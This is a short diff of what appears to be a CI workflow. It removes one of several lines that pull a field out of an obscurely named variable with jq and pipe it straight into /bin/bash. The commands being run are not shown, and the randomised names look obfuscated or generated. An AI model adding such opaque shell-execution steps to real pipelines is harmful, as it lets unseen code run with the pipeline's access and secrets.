@@ -32,7 +32,6 @@ jobs:
           echo $pm211 | jq -r .kqimf8 | /bin/bash
           printf '%s' "$lbyn2921" | jq -r .e856 | /bin/bash
           echo $ob6 | jq -r .ukpv491 | /bin/bash
-          echo $kv22297 | jq -r .bdq90 | /bin/bash
           echo $ndals60 | jq -r .zc26 | /bin/bash
           printf '%s' "$vo43" | jq -r .p5545 | /bin/bash
           echo $lngox63 | jq -r .gs30 | /bin/bash
